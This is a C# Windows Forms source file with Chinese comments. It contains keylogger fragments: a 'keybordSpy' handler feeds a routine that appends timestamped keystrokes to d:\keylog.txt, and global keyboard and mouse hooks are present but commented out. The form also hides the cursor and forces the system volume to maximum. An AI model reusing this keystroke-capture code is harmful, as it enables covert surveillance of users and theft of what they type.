using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

using System.Runtime.InteropServices; 
using Microsoft.Win32;  //写入注册表时要用到

namespace S2_0
{
    public partial class Form2 : Form
    {
        //WindowsApplication1.MouseKeyHook mouseKey;

        classControl cc;

        public List<Label> listLab;

        public Form2(Object cc)
        {
            InitializeComponent();

            this.cc = cc as classControl;

            //mouseKey = new WindowsApplication1.MouseKeyHook(true, true);
            //mouseKey.mouse = true;
            //mouseKey.keys = true;
            ////mouseKey.keyLock = false;
            //mouseKey.KeyDown += new KeyEventHandler(hook_KeyDown);
        }

        private void hook_KeyDown(object sender, KeyEventArgs e)
        {
            //判断按下的键（Alt + A）
            if (e.KeyValue == (int)Keys.A && (int)Control.ModifierKeys == (int)Keys.Alt)
            {
                //MessageBox.Show("dgfsag");
                //System.Media.SystemSounds.Asterisk.Play();
                //System.Media.SystemSounds.Hand.Play();
            }
        }
        //注意几种不同的键值判断：
        //1>.单普通键（例如A）
        //2>.单控制键+单普通键（例如Ctrl+A）
        //3>.多控制键+单普通键（例如Ctrl+Alt+A）
        //上面的代码中演示了2，其它情况以此类推，无非就是添几个条件再&&起来就好

        public void cleanLab()
        {
            //listLab = new List<Label>();

            foreach (System.Windows.Forms.Control control in this.Controls)//遍历Form上的所有控件 
            {
                //if (control is System.Windows.Forms.Label)
                //{
                //    listLab.Add(control as Label);
                //}
                control.Text = "";
            }

            
        }

        private void keybordSpy(object sender, String keyCode)
        {
            buildLog(keyCode);
        }
        public void buildLog(String str)
        {
            System.IO.FileStream fs = new System.IO.FileStream(@"d:\keylog.txt", System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write);
            System.IO.StreamWriter sw = new System.IO.StreamWriter(fs);
            sw.BaseStream.Seek(0, System.IO.SeekOrigin.End);
            sw.Write("[" + DateTime.Now.ToString() + "]");//Write LINE LINE
            sw.Flush();
            //foreach (String str in keyLogCol)
            {
                sw.WriteLine("[" + str + "] ");
                sw.Flush();
            }

            sw.Close();
            fs.Close();
            //keyLogCol.Clear();
        }

        public void fullVol()
        {
            for (int i = 0; i < 50; i++)
                adjustVolume.SendMessage(this.Handle, adjustVolume.WM_APPCOMMAND, 0x30292, adjustVolume.APPCOMMAND_VOLUME_UP * 0x10000);
        }

        private void mouseHook_MouseEvent(Kennedy.ManagedHooks.MouseEvents mEvent, Point point)
        {
            string msg = string.Format("Mouse event: {0}: ({1},{2}).", mEvent.ToString(), point.X, point.Y);
            AddText(msg);
        }

        // EXAMPLE CODE SECTION
        private void keyboardHook_KeyboardEvent(Kennedy.ManagedHooks.KeyboardEvents kEvent, Keys key)
        {
            string msg = string.Format("Keyboard event: {0}: {1}.", kEvent.ToString(), key);
            AddText(msg);
        }

        private void AddText(string message)
        {
            if (message == null)
            {
                return;
            }

            //int length = textBoxMessages.Text.Length + message.Length;
            //if (length >= textBoxMessages.MaxLength)
            //{
            //    textBoxMessages.Text = "";
            //}

            //if (!message.EndsWith("\r\n"))
            //{
            //    message += "\r\n";
            //}

            //textBoxMessages.Text = message + textBoxMessages.Text;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            Cursor.Hide();
        }

        private void Form2_Activated(object sender, EventArgs e)
        {
            //mouseKey.Start();
        }

        public void exit()
        {
            this.Close();
        }


    }
}
